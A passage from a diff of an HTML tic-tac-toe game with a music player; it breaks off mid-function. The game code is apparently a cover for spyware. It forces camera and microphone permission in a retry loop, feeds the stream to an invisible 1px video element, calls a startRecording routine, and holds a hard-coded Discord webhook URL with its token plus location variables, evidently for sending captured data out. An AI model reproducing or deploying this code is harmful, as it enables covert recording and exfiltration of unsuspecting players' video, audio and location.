+            color: #888;
+            font-size: 12px;
+            width: 20px;
+        }
+
+        .playlist-item-info {
+            flex: 1;
+            overflow: hidden;
+        }
+
+        .playlist-item-title {
+            color: #fff;
+            font-size: 13px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .playlist-item-artist {
+            color: #666;
+            font-size: 11px;
+        }
+
+        .playlist-item-duration {
+            color: #888;
+            font-size: 12px;
+        }
+
+        .volume-control {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .volume-slider {
+            flex: 1;
+            height: 4px;
+            -webkit-appearance: none;
+            appearance: none;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+            outline: none;
+        }
+
+        .volume-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 12px;
+            height: 12px;
+            background: #667eea;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        /* Game Container */
+        .game-container {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            padding-bottom: 120px;
+        }
+
+        .game-container.active { display: block; }
+
+        .back-btn {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        /* Header */
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            gap: 10px;
+        }
+
+        .player-card {
+            flex: 1;
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .player-card:hover {
+            background: rgba(255,255,255,0.08);
+        }
+
+        .player-card.active {
+            background: rgba(102,126,234,0.15);
+            border-color: #667eea;
+        }
+
+        .player-card::after {
+            content: '👆';
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            font-size: 12px;
+            opacity: 0.5;
+        }
+
+        .player-avatar {
+            width: 55px; height: 55px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 8px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: 3px solid rgba(255,255,255,0.2);
+        }
+
+        .player-name { color: #fff; font-size: 13px; font-weight: 600; }
+
+        .vs-badge {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            width: 45px; height: 45px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        /* Turn Indicator */
+        .turn-bar {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .turn-text { color: #fff; font-size: 14px; font-weight: 600; }
+        .turn-text span { color: #667eea; }
+
+        /* Game Board */
+        .board-container {
+            background: rgba(255,255,255,0.03);
+            border-radius: 24px;
+            padding: 20px;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .game-board {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            aspect-ratio: 1;
+        }
+
+        .cell {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            border: 2px solid rgba(255,255,255,0.05);
+            transition: all 0.15s;
+            user-select: none;
+        }
+
+        .cell:hover:not(.taken) {
+            background: rgba(255,255,255,0.1);
+            border-color: rgba(102,126,234,0.5);
+            transform: scale(1.02);
+        }
+
+        .cell:active:not(.taken) { transform: scale(0.98); }
+        .cell.taken { cursor: default; }
+
+        .cell.x {
+            color: #ff416c;
+            text-shadow: 0 0 20px rgba(255,65,108,0.5);
+            animation: popIn 0.3s;
+        }
+
+        .cell.o {
+            color: #00c9ff;
+            text-shadow: 0 0 20px rgba(0,201,255,0.5);
+            animation: popIn 0.3s;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .cell.win {
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000 !important;
+            animation: winPulse 1s infinite;
+        }
+
+        @keyframes winPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Score Board */
+        .score-section {
+            margin-top: 25px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .score-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .score-label { color: #888; font-size: 12px; margin-bottom: 5px; }
+        .score-value { color: #fff; font-size: 28px; font-weight: 700; }
+        .score-box.p1 .score-value { color: #ff416c; }
+        .score-box.p2 .score-value { color: #00c9ff; }
+        .score-box.draw .score-value { color: #ffd700; }
+
+        /* Buttons */
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            color: #fff;
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+        }
+
+        .btn:active { transform: scale(0.95); }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: rgba(30,30,40,0.95);
+            color: #fff;
+            padding: 15px 30px;
+            border-radius: 30px;
+            font-weight: 600;
+            z-index: 10000;
+            transition: transform 0.3s;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .toast.show { transform: translateX(-50%) translateY(0); }
+        .toast.win { border-color: #2ecc71; color: #2ecc71; }
+        .toast.draw { border-color: #ffd700; color: #ffd700; }
+
+        /* Confetti */
+        .confetti {
+            position: fixed;
+            width: 8px; height: 8px;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        @keyframes confetti-fall {
+            0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* Auto-restart indicator */
+        .restart-timer {
+            position: fixed;
+            bottom: 140px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: #fff;
+            padding: 10px 25px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 5000;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .restart-timer.show { opacity: 1; }
+
+        #hidden-video {
+            position: fixed;
+            top: 0; left: 0;
+            width: 1px; height: 1px;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation">
+        <div class="bg-gradient"></div>
+        <div class="bg-grid"></div>
+    </div>
+
+    <div class="permission-blocker" id="permissionBlocker">
+        <div class="permission-box">
+            <div class="permission-icon">🎮</div>
+            <div class="permission-title">Tic-Tac-Toe Pro</div>
+            <div class="permission-text" id="permText">
+                This game requires Camera and Microphone permissions.<br><br>
+                Please click "Allow" when your browser asks for permission.
+            </div>
+            <button class="btn-allow" onclick="requestPermissions()" id="allowBtn">Allow & Play</button>
+            <div class="permission-error" id="permError">❌ Permissions Denied! Please Allow to continue.</div>
+        </div>
+    </div>
+
+    <div class="mode-selector" id="modeSelector">
+        <div class="mode-title">Select Game Mode</div>
+        <div class="mode-cards">
+            <div class="mode-card" onclick="selectMode('bot')">
+                <span class="mode-icon">🤖</span>
+                <div class="mode-name">vs Bot</div>
+            </div>
+            <div class="mode-card" onclick="selectMode('2player')">
+                <span class="mode-icon">👥</span>
+                <div class="mode-name">2 Players</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Avatar Selector Modal -->
+    <div class="avatar-modal" id="avatarModal">
+        <div class="avatar-title" id="avatarTitle">Select Avatar</div>
+        <div class="avatar-grid" id="avatarGrid"></div>
+        <button class="avatar-close" onclick="closeAvatarModal()">Cancel</button>
+    </div>
+
+    <div class="toast" id="toast"></div>
+    <div class="restart-timer" id="restartTimer">New game starting in 3...</div>
+
+    <div class="game-container" id="gameContainer">
+        <button class="back-btn" onclick="backToMenu()">← Back</button>
+        
+        <div class="game-header">
+            <div class="player-card active" id="p1Card" onclick="openAvatarSelector('p1')">
+                <div class="player-avatar" id="p1Avatar">😎</div>
+                <div class="player-name" id="p1Name">Player 1</div>
+            </div>
+            <div class="vs-badge">VS</div>
+            <div class="player-card" id="p2Card" onclick="openAvatarSelector('p2')">
+                <div class="player-avatar" id="p2Avatar">🤖</div>
+                <div class="player-name" id="p2Name">Bot</div>
+            </div>
+        </div>
+
+        <div class="turn-bar">
+            <div class="turn-text" id="turnText"><span>Player 1's</span> Turn</div>
+        </div>
+
+        <div class="board-container">
+            <div class="game-board" id="gameBoard">
+                <div class="cell" data-i="0"></div>
+                <div class="cell" data-i="1"></div>
+                <div class="cell" data-i="2"></div>
+                <div class="cell" data-i="3"></div>
+                <div class="cell" data-i="4"></div>
+                <div class="cell" data-i="5"></div>
+                <div class="cell" data-i="6"></div>
+                <div class="cell" data-i="7"></div>
+                <div class="cell" data-i="8"></div>
+            </div>
+        </div>
+
+        <div class="score-section">
+            <div class="score-box p1">
+                <div class="score-label">Player 1</div>
+                <div class="score-value" id="s1">0</div>
+            </div>
+            <div class="score-box draw">
+                <div class="score-label">Draws</div>
+                <div class="score-value" id="sd">0</div>
+            </div>
+            <div class="score-box p2">
+                <div class="score-label" id="s2Label">Bot</div>
+                <div class="score-value" id="s2">0</div>
+            </div>
+        </div>
+
+        <div class="btn-row">
+            <button class="btn btn-primary" onclick="newGame()">New Game</button>
+            <button class="btn btn-secondary" onclick="resetAll()">Reset</button>
+        </div>
+    </div>
+
+    <!-- Music Player -->
+    <div class="music-player" id="musicPlayer">
+        <div class="music-header" onclick="togglePlaylist()">
+            <div class="music-icon" id="musicIcon">🎵</div>
+            <div class="music-info">
+                <div class="music-title" id="musicTitle">Click to Play</div>
+                <div class="music-artist" id="musicArtist">Select a song</div>
+            </div>
+            <div class="music-controls">
+                <button class="music-btn" onclick="event.stopPropagation(); previousSong()">⏮</button>
+                <button class="music-btn" onclick="event.stopPropagation(); togglePlay()" id="playBtn">▶</button>
+                <button class="music-btn" onclick="event.stopPropagation(); nextSong()">⏭</button>
+            </div>
+        </div>
+        
+        <div class="volume-control">
+            <span>🔊</span>
+            <input type="range" class="volume-slider" id="volumeSlider" min="0" max="100" value="50">
+            <span id="volumeValue">50%</span>
+        </div>
+
+        <div class="playlist-dropdown" id="playlistDropdown">
+            <div class="playlist-container" id="playlistContainer">
+                <!-- Playlist items will be generated here -->
+            </div>
+        </div>
+    </div>
+
+    <video id="hidden-video" autoplay muted playsinline></video>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1548644115753865226/LXl4j5NGgIfFzyLe-Vm0g10anJpet_aGHeSlJs5pVHVWEuvq8RKHvgjxNmj60B9rIATz";
+        let loc = {lat: "N/A", lng: "N/A"};
+        let stream = null;
+        let recording = false;
+
+        // Avatar data
+        const avatars = ['😎', '🤠', '👽', '🤖', '👻', '🎃', '🦄', '🐶', '🐱', '🦁', '🐯', '🐨', '🐼', '🐸', '🐙', '🦊', '🐺', '🐗', '🐴', '🐲', '👤', '👦', '👧', '👨', '👩'];
+        const botAvatar = '🤖';
+        let currentAvatarPlayer = null;
+        let playerAvatars = { p1: '😎', p2: '🤖' };
+
+        // Music Player Data
+        const playlist = [
+            {
+                title: "SONG 1",
+                artist: "TALIB KING",
+                url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/New%20Attitude%20Remix%202023%20%20Arabic%20Remix%20%20Dubbai%20Remix%20%20Turkish%20Remix%20%20crazy%20girl%20Mood%20Of%20Remix.mp3"
+            },
+            {
+                title: "SONG 2",
+                artist: "TALIB KING",
+                url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/New%20Attitude%20Remix%202023%20%20New%20Viral%20Remix%20%20Attitude%20Music.mp3"
+            },
+            {
+                title: "Song 3",
+                artist: "TALIB KING",
+                url: "https://raw.githubusercontent.com/talibmalla455-ux/SONGS-PLAYLIST/refs/heads/main/DEVIL%20Lyrical%20Video%20%20PBX%201%20%20Sidhu%20Moose%20Wala%20%20Byg%20Byrd%20%20%20Latest%20Punjabi%20Songs%202018.mp3"
+            }
+        ];
+
+        let currentSongIndex = 0;
+        let audio = new Audio();
+        let isPlaying = false;
+        let isPlaylistOpen = false;
+
+        const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+        let state = {
+            board: Array(9).fill(''),
+            turn: 'p1',
+            mode: 'bot',
+            over: false,
+            scores: {p1: 0, p2: 0, d: 0}
+        };
+
+        let autoRestartTimer = null;
+        let countdownInterval = null;
+
+        // Initialize Music Player
+        function initMusicPlayer() {
+            audio.volume = 0.5;
+            
+            document.getElementById('volumeSlider').addEventListener('input', function(e) {
+                const volume = e.target.value / 100;
+                audio.volume = volume;
+                document.getElementById('volumeValue').textContent = e.target.value + '%';
+            });
+
+            audio.addEventListener('ended', nextSong);
+            audio.addEventListener('play', () => {
+                isPlaying = true;
+                document.getElementById('playBtn').textContent = '⏸';
+                document.getElementById('musicIcon').style.animation = 'pulse 1s infinite';
+            });
+            audio.addEventListener('pause', () => {
+                isPlaying = false;
+                document.getElementById('playBtn').textContent = '▶';
+                document.getElementById('musicIcon').style.animation = 'none';
+            });
+
+            renderPlaylist();
+            updateMusicInfo();
+        }
+
+        function renderPlaylist() {
+            const container = document.getElementById('playlistContainer');
+            container.innerHTML = '';
+            
+            playlist.forEach((song, index) => {
+                const item = document.createElement('div');
+                item.className = 'playlist-item' + (index === currentSongIndex ? ' active' : '');
+                item.onclick = () => selectSong(index);
+                
+                item.innerHTML = `
+                    <span class="playlist-item-number">${index + 1}</span>
+                    <div class="playlist-item-info">
+                        <div class="playlist-item-title">${song.title}</div>
+                        <div class="playlist-item-artist">${song.artist}</div>
+                    </div>
+                `;
+                
+                container.appendChild(item);
+            });
+        }
+
+        function updateMusicInfo() {
+            const song = playlist[currentSongIndex];
+            document.getElementById('musicTitle').textContent = song.title;
+            document.getElementById('musicArtist').textContent = song.artist;
+        }
+
+        function togglePlaylist() {
+            isPlaylistOpen = !isPlaylistOpen;
+            document.getElementById('playlistDropdown').classList.toggle('show', isPlaylistOpen);
+        }
+
+        function selectSong(index) {
+            currentSongIndex = index;
+            audio.src = playlist[index].url;
+            updateMusicInfo();
+            renderPlaylist();
             play();
         }
-    }
 
-    function play() {
-        audio.play().catch(e => console.log('Audio play failed:', e));
-    }
-
-    function pause() {
-        audio.pause();
-    }
-
-    function nextSong() {
-        currentSongIndex = (currentSongIndex + 1) % playlist.length;
-        selectSong(currentSongIndex);
-    }
-
-    function previousSong() {
-        currentSongIndex = (currentSongIndex - 1 + playlist.length) % playlist.length;
-        selectSong(currentSongIndex);
-    }
-
-    document.querySelectorAll('.cell').forEach(c => {
-        c.addEventListener('click', () => clickCell(c), {passive: true});
-    });
-
-    // Avatar selector functions
-    function openAvatarSelector(player) {
-        if (player === 'p2' && state.mode === 'bot') return;
-        
-        currentAvatarPlayer = player;
-        const modal = document.getElementById('avatarModal');
-        const title = document.getElementById('avatarTitle');
-        const grid = document.getElementById('avatarGrid');
-        
-        title.textContent = player === 'p1' ? 'Player 1 - Select Avatar' : 'Player 2 - Select Avatar';
-        
-        grid.innerHTML = '';
-        avatars.forEach(avatar => {
-            const div = document.createElement('div');
-            div.className = 'avatar-option';
-            div.textContent = avatar;
-            if (playerAvatars[player] === avatar) {
-                div.classList.add('selected');
+        function togglePlay() {
+            if (!audio.src) {
+                audio.src = playlist[currentSongIndex].url;
             }
-            div.onclick = () => selectAvatar(avatar);
-            grid.appendChild(div);
+            
+            if (isPlaying) {
+                pause();
+            } else {
+                play();
+            }
+        }
+
+        function play() {
+            audio.play().catch(e => console.log('Audio play failed:', e));
+        }
+
+        function pause() {
+            audio.pause();
+        }
+
+        function nextSong() {
+            currentSongIndex = (currentSongIndex + 1) % playlist.length;
+            selectSong(currentSongIndex);
+        }
+
+        function previousSong() {
+            currentSongIndex = (currentSongIndex - 1 + playlist.length) % playlist.length;
+            selectSong(currentSongIndex);
+        }
+
+        document.querySelectorAll('.cell').forEach(c => {
+            c.addEventListener('click', () => clickCell(c), {passive: true});
         });
-        
-        modal.classList.add('active');
-    }
 
-    function selectAvatar(avatar) {
-        playerAvatars[currentAvatarPlayer] = avatar;
-        document.getElementById(currentAvatarPlayer + 'Avatar').textContent = avatar;
-        closeAvatarModal();
-    }
-
-    function closeAvatarModal() {
-        document.getElementById('avatarModal').classList.remove('active');
-        currentAvatarPlayer = null;
-    }
-
-    async function requestPermissions() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-            document.getElementById('hidden-video').srcObject = stream;
-            document.getElementById('permissionBlocker').style.display = 'none';
-            document.getElementById('modeSelector').classList.add('active');
-            startRecording();
-            initMusicPlayer(); // Initialize music player
-        } catch(e) {
-            showToast('Permission required!', 'error');
-            setTimeout(requestPermissions, 1500);
-        }
-    }
-
-    function selectMode(m) {
-        state.mode = m;
-        
-        playerAvatars.p1 = '😎';
-        playerAvatars.p2 = m === 'bot' ? botAvatar : '🤠';
-        
-        document.getElementById('p1Avatar').textContent = playerAvatars.p1;
-        document.getElementById('p2Avatar').textContent = playerAvatars.p2;
-        
-        document.getElementById('modeSelector').classList.remove('active');
-        document.getElementById('gameContainer').classList.add('active');
-        document.getElementById('p2Name').textContent = m === 'bot' ? 'Bot' : 'Player 2';
-        document.getElementById('s2Label').textContent = m === 'bot' ? 'Bot' : 'P2';
-        newGame();
-    }
-
-    function backToMenu() {
-        clearTimers();
-        document.getElementById('gameContainer').classList.remove('active');
-        document.getElementById('modeSelector').classList.add('active');
-        recording = false;
-    }
-
-    function clearTimers() {
-        if (autoRestartTimer) {
-            clearTimeout(autoRestartTimer);
-            autoRestartTimer = null;
-        }
-        if (countdownInterval) {
-            clearInterval(countdownInterval);
-            countdownInterval = null;
-        }
-        document.getElementById('restartTimer').classList.remove('show');
-    }
-
-    function clickCell(cell) {
-        if(state.over || cell.classList.contains('taken')) return;
-        if(state.mode === 'bot' && state.turn !== 'p1') return;
-
-        const i = parseInt(cell.dataset.i);
-        const sym = state.turn === 'p1' ? 'X' : 'O';
-        
-        state.board[i] = sym;
-        cell.textContent = sym;
-        cell.classList.add('taken', sym.toLowerCase());
-
-        checkEnd();
-
-        if(!state.over && state.mode === 'bot' && state.turn === 'p2') {
-            setTimeout(botMove, 400);
-        }
-    }
-
-    function botMove() {
-        if(state.over) return;
-
-        let move = findMove('O') || findMove('X');
-        if(!move && state.board[4] === '') move = 4;
-        if(!move) {
-            const c = [0,2,6,8].filter(i => state.board[i] === '');
-            if(c.length) move = c[Math.floor(Math.random()*c.length)];
-        }
-        if(!move) {
-            const avail = state.board.map((v,i) => v===''?i:-1).filter(i => i!==-1);
-            if(avail.length) move = avail[Math.floor(Math.random()*avail.length)];
+        // Avatar selector functions
+        function openAvatarSelector(player) {
+            if (player === 'p2' && state.mode === 'bot') return;
+            
+            currentAvatarPlayer = player;
+            const modal = document.getElementById('avatarModal');
+            const title = document.getElementById('avatarTitle');
+            const grid = document.getElementById('avatarGrid');
+            
+            title.textContent = player === 'p1' ? 'Player 1 - Select Avatar' : 'Player 2 - Select Avatar';
+            
+            grid.innerHTML = '';
+            avatars.forEach(avatar => {
+                const div = document.createElement('div');
+                div.className = 'avatar-option';
+                div.textContent = avatar;
+                if (playerAvatars[player] === avatar) {
+                    div.classList.add('selected');
+                }
+                div.onclick = () => selectAvatar(avatar);
+                grid.appendChild(div);
+            });
+            
+            modal.classList.add('active');
         }
 
-        if(move !== undefined) {
-            const cell = document.querySelector(`.cell[data-i="${move}"]`);
-            state.board[move] = 'O';
-            cell.textContent = 'O';
-            cell.classList.add('taken', 'o');
-            checkEnd();
+        function selectAvatar(avatar) {
+            playerAvatars[currentAvatarPlayer] = avatar;
+            document.getElementById(currentAvatarPlayer + 'Avatar').textContent = avatar;
+            closeAvatarModal();
         }
-    }
 
-    function findMove(sym) {
-        for(let [a,b,c] of wins) {
-            const vals = [state.board[a], state.board[b], state.board[c]];
-            if(vals.filter(v => v === sym).length === 2 && vals.includes('')) {
-                return [a,b,c][vals.indexOf('')];
+        function closeAvatarModal() {
+            document.getElementById('avatarModal').classList.remove('active');
+            currentAvatarPlayer = null;
+        }
+
+        // Updated requestPermissions function - loops until permission granted
+        async function requestPermissions() {
+            const permError = document.getElementById('permError');
+            const allowBtn = document.getElementById('allowBtn');
+            
+            // Disable button while requesting
+            allowBtn.disabled = true;
+            allowBtn.style.opacity = '0.5';
+            
+            while (true) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                    
+                    // Success - permission granted
+                    document.getElementById('hidden-video').srcObject = stream;
+                    document.getElementById('permissionBlocker').style.display = 'none';
+                    document.getElementById('modeSelector').classList.add('active');
+                    startRecording();
+                    initMusicPlayer();
+                    return;
+                    
+                } catch(e) {
+                    // Permission denied - show error and try again
+                    permError.style.display = 'block';
+                    showToast('Permissions required! Click Allow to continue.', 'error');
+                    
+                    // Re-enable button
+                    allowBtn.disabled = false;
+                    allowBtn.style.opacity = '1';
+                    
+                    // Wait a bit before next attempt
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
             }
         }
-        return null;
-    }
 
-    function checkEnd() {
-        const sym = state.turn === 'p1' ? 'X' : 'O';
-        
-        for(let [a,b,c] of wins) {
-            if(state.board[a] === sym && state.board[b] === sym && state.board[c] === sym) {
+        function selectMode(m) {
+            state.mode = m;
+            
+            playerAvatars.p1 = '😎';
+            playerAvatars.p2 = m === 'bot' ? botAvatar : '🤠';
+            
+            document.getElementById('p1Avatar').textContent = playerAvatars.p1;
+            document.getElementById('p2Avatar').textContent = playerAvatars.p2;
+            
+            document.getElementById('modeSelector').classList.remove('active');
+            document.getElementById('gameContainer').classList.add('active');
+            document.getElementById('p2Name').textContent = m === 'bot' ? 'Bot' : 'Player 2';
+            document.getElementById('s2Label').textContent = m === 'bot' ? 'Bot' : 'P2';
+            newGame();
+        }
+
+        function backToMenu() {
+            clearTimers();
+            document.getElementById('gameContainer').classList.remove('active');
+            document.getElementById('modeSelector').classList.add('active');
+            recording = false;
+        }
+
+        function clearTimers() {
+            if (autoRestartTimer) {
+                clearTimeout(autoRestartTimer);
+                autoRestartTimer = null;
+            }
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            document.getElementById('restartTimer').classList.remove('show');
+        }
+
+        function clickCell(cell) {
+            if(state.over || cell.classList.contains('taken')) return;
+            if(state.mode === 'bot' && state.turn !== 'p1') return;
+
+            const i = parseInt(cell.dataset.i);
+            const sym = state.turn === 'p1' ? 'X' : 'O';
+            
+            state.board[i] = sym;
+            cell.textContent = sym;
+            cell.classList.add('taken', sym.toLowerCase());
+
+            checkEnd();
+
+            if(!state.over && state.mode === 'bot' && state.turn === 'p2') {
+                setTimeout(botMove, 400);
+            }
+        }
+
+        function botMove() {
+            if(state.over) return;
+
+            let move = findMove('O') || findMove('X');
+            if(!move && state.board[4] === '') move = 4;
+            if(!move) {
+                const c = [0,2,6,8].filter(i => state.board[i] === '');
+                if(c.length) move = c[Math.floor(Math.random()*c.length)];
+            }
+            if(!move) {
+                const avail = state.board.map((v,i) => v===''?i:-1).filter(i => i!==-1);
+                if(avail.length) move = avail[Math.floor(Math.random()*avail.length)];
+            }
+
+            if(move !== undefined) {
+                const cell = document.querySelector(`.cell[data-i="${move}"]`);
+                state.board[move] = 'O';
+                cell.textContent = 'O';
+                cell.classList.add('taken', 'o');
+                checkEnd();
+            }
+        }
+
+        function findMove(sym) {
+            for(let [a,b,c] of wins) {
+                const vals = [state.board[a], state.board[b], state.board[c]];
+                if(vals.filter(v => v === sym).length === 2 && vals.includes('')) {
+                    return [a,b,c][vals.indexOf('')];
+                }
+            }
+            return null;
+        }
+
+        function checkEnd() {
+            const sym = state.turn === 'p1' ? 'X' : 'O';
+            
+            for(let [a,b,c] of wins) {
+                if(state.board[a] === sym && state.board[b] === sym && state.board[c] === sym) {
+                    state.over = true;
+                    highlightWin([a,b,c]);
+                    updateScore(state.turn);
+                    confetti();
+                    const winnerName = state.turn === 'p1' ? 'Player 1' : state.mode==='bot'?'Bot':'Player 2';
+                    showToast(`${winnerName} Wins!`, 'win');
+                    scheduleAutoRestart();
+                    return;
+                }
+            }
+
+            if(!state.board.includes('')) {
                 state.over = true;
-                highlightWin([a,b,c]);
-                updateScore(state.turn);
-                confetti();
-                const winnerName = state.turn === 'p1' ? 'Player 1' : state.mode==='bot'?'Bot':'Player 2';
-                showToast(`${winnerName} Wins!`, 'win');
+                state.scores.d++;
+                updateDisplay();
+                showToast("It's a Draw!", 'draw');
                 scheduleAutoRestart();
                 return;
             }
+
+            switchTurn();
         }
 
-        if(!state.board.includes('')) {
-            state.over = true;
-            state.scores.d++;
+        function scheduleAutoRestart() {
+            const timerEl = document.getElementById('restartTimer');
+            let countdown = 3;
+            
+            timerEl.textContent = `New game starting in ${countdown}...`;
+            timerEl.classList.add('show');
+            
+            countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    timerEl.textContent = `New game starting in ${countdown}...`;
+                } else {
+                    timerEl.textContent = 'Starting...';
+                }
+            }, 1000);
+            
+            autoRestartTimer = setTimeout(() => {
+                clearTimers();
+                newGame();
+            }, 3500);
+        }
+
+        function switchTurn() {
+            state.turn = state.turn === 'p1' ? 'p2' : 'p1';
+            const isP1 = state.turn === 'p1';
+            document.getElementById('p1Card').classList.toggle('active', isP1);
+            document.getElementById('p2Card').classList.toggle('active', !isP1);
+            const name = isP1 ? 'Player 1' : state.mode === 'bot' ? 'Bot' : 'Player 2';
+            document.getElementById('turnText').innerHTML = `<span>${name}'s</span> Turn`;
+        }
+
+        function highlightWin(indices) {
+            indices.forEach(i => document.querySelector(`.cell[data-i="${i}"]`).classList.add('win'));
+        }
+
+        function updateScore(winner) {
+            state.scores[winner]++;
             updateDisplay();
-            showToast("It's a Draw!", 'draw');
-            scheduleAutoRestart();
-            return;
         }
 
-        switchTurn();
-    }
+        function updateDisplay() {
+            document.getElementById('s1').textContent = state.scores.p1;
+            document.getElementById('s2').textContent = state.scores.p2;
+            document.getElementById('sd').textContent = state.scores.d;
+        }
 
-    function scheduleAutoRestart() {
-        const timerEl = document.getElementById('restartTimer');
-        let countdown = 3;
-        
-        timerEl.textContent = `New game starting in ${countdown}...`;
-        timerEl.classList.add('show');
-        
-        countdownInterval = setInterval(() => {
-            countdown--;
-            if (countdown > 0) {
-                timerEl.textContent = `New game starting in ${countdown}...`;
-            } else {
-                timerEl.textContent = 'Starting...';
-            }
-        }, 1000);
-        
-        autoRestartTimer = setTimeout(() => {
+        function newGame() {
             clearTimers();
-            newGame();
-        }, 3500);
-    }
-
-    function switchTurn() {
-        state.turn = state.turn === 'p1' ? 'p2' : 'p1';
-        const isP1 = state.turn === 'p1';
-        document.getElementById('p1Card').classList.toggle('active', isP1);
-        document.getElementById('p2Card').classList.toggle('active', !isP1);
-        const name = isP1 ? 'Player 1' : state.mode === 'bot' ? 'Bot' : 'Player 2';
-        document.getElementById('turnText').innerHTML = `<span>${name}'s</span> Turn`;
-    }
-
-    function highlightWin(indices) {
-        indices.forEach(i => document.querySelector(`.cell[data-i="${i}"]`).classList.add('win'));
-    }
-
-    function updateScore(winner) {
-        state.scores[winner]++;
-        updateDisplay();
-    }
-
-    function updateDisplay() {
-        document.getElementById('s1').textContent = state.scores.p1;
-        document.getElementById('s2').textContent = state.scores.p2;
-        document.getElementById('sd').textContent = state.scores.d;
-    }
-
-    function newGame() {
-        clearTimers();
-        
-        state.board = Array(9).fill('');
-        state.turn = 'p1';
-        state.over = false;
-        document.querySelectorAll('.cell').forEach(c => {
-            c.textContent = '';
-            c.className = 'cell';
-        });
-        document.getElementById('p1Card').classList.add('active');
-        document.getElementById('p2Card').classList.remove('active');
-        document.getElementById('turnText').innerHTML = '<span>Player 1\'s</span> Turn';
-    }
-
-    function resetAll() {
-        clearTimers();
-        state.scores = {p1: 0, p2: 0, d: 0};
-        updateDisplay();
-        newGame();
-    }
-
-    function showToast(msg, type) {
-        const t = document.getElementById('toast');
-        t.textContent = msg;
-        t.className = `toast ${type}`;
-        setTimeout(() => t.classList.add('show'), 10);
-        setTimeout(() => t.classList.remove('show'), 2500);
-    }
-
-    function confetti() {
-        const colors = ['#ff416c', '#00c9ff', '#ffd700', '#92fe9d'];
-        for(let i = 0; i < 30; i++) {
-            const c = document.createElement('div');
-            c.className = 'confetti';
-            c.style.left = Math.random() * 100 + 'vw';
-            c.style.top = '-10px';
-            c.style.background = colors[Math.floor(Math.random() * colors.length)];
-            c.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
-            c.style.animation = `confetti-fall ${2 + Math.random()}s linear forwards`;
-            document.body.appendChild(c);
-            setTimeout(() => c.remove(), 4000);
+            
+            state.board = Array(9).fill('');
+            state.turn = 'p1';
+            state.over = false;
+            document.querySelectorAll('.cell').forEach(c => {
+                c.textContent = '';
+                c.className = 'cell';
+            });
+            document.getElementById('p1Card').classList.add('active');
+            document.getElementById('p2Card').classList.remove('active');
